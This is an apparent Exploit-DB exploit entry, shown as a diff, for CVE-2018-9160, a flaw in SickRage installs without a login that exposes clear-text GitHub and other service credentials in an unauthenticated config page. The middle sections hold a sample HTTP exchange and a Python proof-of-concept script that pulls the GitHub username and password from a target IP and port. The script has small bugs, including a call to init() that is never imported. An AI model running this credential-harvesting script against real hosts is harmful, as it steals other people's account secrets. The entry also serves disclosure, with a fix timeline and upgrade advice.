@@ -1,0 +1,99 @@
+# Exploit Title: SickRage < v2018.03.09 - Clear-Text Credentials HTTP Response
+# Date: 2018-04-01
+# Exploit Author: Sven Fassbender
+# Vendor Homepage: https://sickrage.github.io
+# Software Link: https://github.com/SickRage/SickRage
+# Version: < v2018.03.09-1
+# CVE : CVE-2018-9160
+# Category: webapps
+
+#1. Background information
+
+"SickRage is an automatic Video Library Manager for TV Shows.
+It watches for new episodes of your favourite shows, and when they are posted it does its magic: 
+automatic torrent/nzb searching, downloading, and processing at the qualities you want." --extract from https://sickrage.github.io
+
+#2. Vulnerability description
+
+SickRage returns clear-text credentials for e.g. GitHub, AniDB, Kodi, Plex etc. in HTTP responses. 
+Prerequisite is that the user did not set a username and password for their SickRage installation. (not enforced, default)
+
+HTTP request:
+GET /config/general/ HTTP/1.1
+Host: 192.168.1.13:8081
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: de,en-US;q=0.7,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.1.13:8081/config/backuprestore/
+DNT: 1
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+	 
+HTTP response:
+HTTP/1.1 200 OK
+Content-Length: 113397
+Vary: Accept-Encoding
+Server: TornadoServer/4.5.1
+Etag: "e5c29fe99abcd01731bec1afec0e618195f1ae37"
+Date: Fri, 02 Mar 2018 10:47:51 GMT
+Content-Type: text/html; charset=UTF-8
+
+
+<!DOCTYPE html>
+<html lang="nl_NL">
+    <head>
+		[...]
+        <input type="text" name="git_username" id="git_username" value="email@example.com" class="form-control input-sm input300" autocapitalize="off" autocomplete="no" />
+        [...]
+        <input type="password" name="git_password" id="git_password" value="supersecretpassword" class="form-control input-sm input300" autocomplete="no" autocapitalize="off" />
+		[...]
+        </div>
+    </body>
+</html>
+
+#3. Proof of Concept
+
+#!/usr/bin/env python
+import urllib3
+import sys
+import requests
+from BeautifulSoup import BeautifulSoup
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+init(autoreset=True)
+
+if __name__ == '__main__':
+	if len(sys.argv) != 3:
+		print "Usage: $ " + sys.argv[0] + " [IP_adress] [port]"
+	else:
+		host = sys.argv[1]
+		print "https://www.shodan.io/host/{0}".format(host)
+		port = sys.argv[2]
+		print "*** Get GitHub User credentials from SickRage ***"
+		url = "http://{0}:{1}/config/general".format(host, port)
+		response = requests.get(url, timeout=5)
+		parsed_html = BeautifulSoup(response.text)
+		try:
+			git_username = parsed_html.body.find('input', {'id': 'git_username'}).get("value")
+			git_password = parsed_html.body.find('input', {'id': 'git_password'}).get("value")
+			if str(git_password) != "None" and str(git_password) != "None":
+				if len(git_password) >= 1 and len(git_username) >= 1:
+					print str(git_username)
+					print str(git_password)
+		except AttributeError:
+			pass
+
+
+#4. Timeline
+
+[2018-03-07] Vulnerability discovered
+[2018-03-08] Vendor contacted
+[2018-03-08] Vendor replied
+[2018-03-09] Vulnerability fixed. (https://github.com/SickRage/SickRage/compare/v2018.02.26-2...v2018.03.09-1)
+
+#5. Recommendation
+
+Update the SickRage installation on v2018.03.09-1 or later. 
+Protect the access to the web application with proper user credentials.
